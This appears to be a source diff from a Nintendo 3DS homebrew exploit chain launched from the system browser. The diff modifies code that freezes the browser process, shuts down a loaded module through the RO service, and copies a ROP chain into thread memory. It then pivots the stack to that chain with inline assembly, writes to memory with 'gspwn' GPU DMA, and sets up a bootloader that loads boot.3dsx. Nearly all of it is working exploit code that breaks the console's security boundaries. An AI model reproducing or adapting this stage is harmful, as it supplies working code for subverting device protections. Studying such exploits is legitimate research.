@@ -11,8 +11,9 @@
 
 #include "../../../build/constants.h"
 
-#define SCREEN_TOP_LEFT_1 0x1F1E6000
-#define SCREEN_TOP_LEFT_2 0x1F22C800
+#define TOPFBTEMP ((u8*)SN_TOPFBTEMP)
+#define SCREEN_TOP_LEFT_1 ((u8*)0x1F1E6000)
+#define SCREEN_TOP_LEFT_2 ((u8*)0x1F22C800)
 
 const int dead_data[] = {0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0};
 
@@ -46,7 +47,7 @@ void hex2str(char* out, u32 val)
 	out[8]=0x00;
 }
 
-void doGspwn(u32* src, u32* dst, u32 size)
+void doGspwn(u8* src, u8* dst, u32 size)
 {
 	Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)SN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
 	u32 gxCommand[]=
@@ -69,10 +70,10 @@ void renderString(char* str, int x, int y)
 {
 	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
 	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SN_GSPGPU_FlushDataCache_ADR;
-	drawString(SN_TOPFBTEMP,str,x,y);
-	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, SN_TOPFBTEMP, 240*400*3);
-	doGspwn(SN_TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
-	doGspwn(SN_TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
+	drawString(TOPFBTEMP,str,x,y);
+	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBTEMP, 240*400*3);
+	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
+	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
 }
 
 void centerString(char* str, int y)
@@ -80,10 +81,10 @@ void centerString(char* str, int y)
 	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
 	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SN_GSPGPU_FlushDataCache_ADR;
 	int x=200-(_strlen(str)*4);
-	drawString(SN_TOPFBTEMP,str,x,y);
-	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, SN_TOPFBTEMP, 240*400*3);
-	doGspwn(SN_TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
-	doGspwn(SN_TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
+	drawString(TOPFBTEMP,str,x,y);
+	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBTEMP, 240*400*3);
+	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
+	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
 }
 
 void drawHex(u32 val, int x, int y)
@@ -161,14 +162,28 @@ Result _HB_GetHandle(Handle handle, u32 index, Handle* out)
 	return cmdbuf[1];
 }
 
+Result _RO_Shutdown(Handle handle, u32 processid, u32 crs_buffer)
+{
+	u32* cmdbuf=getThreadCommandBuffer();
+	cmdbuf[0]=0x80042; //request header code
+	cmdbuf[1]=crs_buffer;
+	cmdbuf[2]=0;
+	cmdbuf[3]=processid;
+	
+	Result ret=0;
+	if((ret=svc_sendSyncRequest(handle)))return ret;
+
+	return cmdbuf[1];
+}
+
 void clearScreen(u8 shade)
 {
 	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
 	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SN_GSPGPU_FlushDataCache_ADR;
-	memset(SN_TOPFBTEMP, 0, 240*400*3);
-	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, SN_TOPFBTEMP, 240*400*3);
-	doGspwn(SN_TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
-	doGspwn(SN_TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
+	memset(TOPFBTEMP, 0, 240*400*3);
+	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBTEMP, 240*400*3);
+	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
+	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
 }
 
 void errorScreen(char* str, u32* dv, u8 n)
@@ -201,15 +216,21 @@ void drawTitleScreen(char* str)
 
 int main_initial(void)
 {
-	u32 out;
-	*(int*)SN_FREEZE_APP = dead_data;
+	Handle rohandle;
+	// freeze spider
+	*(const int **)SN_FREEZE_APP = dead_data;
     svc_sleepThread(0x400000LL);
     svc_sleepThread(0x400000LL);
     svc_sleepThread(0x400000LL);
 	drawTitleScreen("");
 	drawTitleScreen("running exploit... 000%");
-	memcpy((u8*)SPIDER_THREAD0ROP_VADR, spider_thread0_rop_bin, spider_thread0_rop_bin_len);
+	// clean up loaded cro
+	rohandle = *(Handle*)SN_ROHANDLE_ADR;
+	_RO_Shutdown(rohandle, 0xFFFF8001, *(u32*)SN_CRS_MAP_ADR);
 	drawTitleScreen("running exploit... 010%");
+	// load next stage
+	memcpy((u8*)SPIDER_THREAD0ROP_VADR, spider_thread0_rop_bin, spider_thread0_rop_bin_len);
+	drawTitleScreen("running exploit... 020%");
 	asm volatile ("mov sp, %0\t\n"
 				  "pop {r0, pc}\t\n" :: "r" (SPIDER_THREAD0ROP_VADR) : "sp", "memory");
 	while (1);
@@ -232,11 +253,11 @@ int main_secondary(Handle hbHandle)
 	// //allocate some memory for the bootloader code (will be remapped)
 	// u32 out; ret=svc_controlMemory(&out, 0x13FF0000, 0x00000000, 0x00008000, MEMOP_COMMIT, 0x3);
 	//allocate some memory for homebrew .text/rodata/data/bss... (will be remapped)
-	u32 out; ret=svc_controlMemory(&out, CN_ALLOCPAGES_ADR, 0x00000000, CN_ADDPAGES*0x1000, MEMOP_COMMIT, 0x3);
+	u32 out; ret=svc_controlMemory(&out, SN_ALLOCPAGES_ADR, 0x00000000, SN_ADDPAGES*0x1000, MEMOP_COMMIT, 0x3);
 
 	drawTitleScreen("running exploit... 080%");
 
-	if(_HB_SetupBootloader(hbHandle, 0x13FF0000))*((u32*)NULL)=0xBABE0061;
+	if(_HB_SetupBootloader(hbHandle, SN_ALLOCPAGES_ADR))*((u32*)NULL)=0xBABE0061;
 
 	drawTitleScreen("running exploit... 090%");
 	
@@ -265,6 +286,8 @@ int main_secondary(Handle hbHandle)
 	svc_closeHandle(*gspHandle);
 
 	setArgs(NULL, 0);
+
+	drawTitleScreen("Loading boot.3dsx...");
 	callBootloader(hbHandle, fileHandle);
 
 	while(1);
